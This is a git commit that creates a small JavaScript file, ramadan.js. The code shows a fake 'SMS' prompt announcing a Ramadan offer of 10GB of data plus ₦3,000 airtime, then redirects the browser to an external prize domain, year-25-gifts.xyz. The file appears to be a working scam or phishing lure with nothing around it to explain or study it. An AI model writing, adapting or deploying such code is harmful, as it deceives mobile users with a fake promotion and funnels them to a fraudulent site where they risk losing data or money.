c0f5e846764e2deac46d63bd9f86545277c380de
bigetijazz18 <bigetijazz18@gmail.com>
2025-03-12 10:20:37 +0100

    Create ramadan.js

---
+++ ramadan.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 10GB + ₦3,000 airtime'
+password=prompt('SMS: Congratulations, you are eligible for the 10GB + ₦3,000 airtime Ramadan offer. Click OK to claim Data gift.','CLAIM 10GB + ₦3,000 airtime');
+if (password != 'CLAIM 10GB + ₦3,000 airtime') {
+location.href='https://www.year-25-gifts.xyz/ramadan10gb';
+}
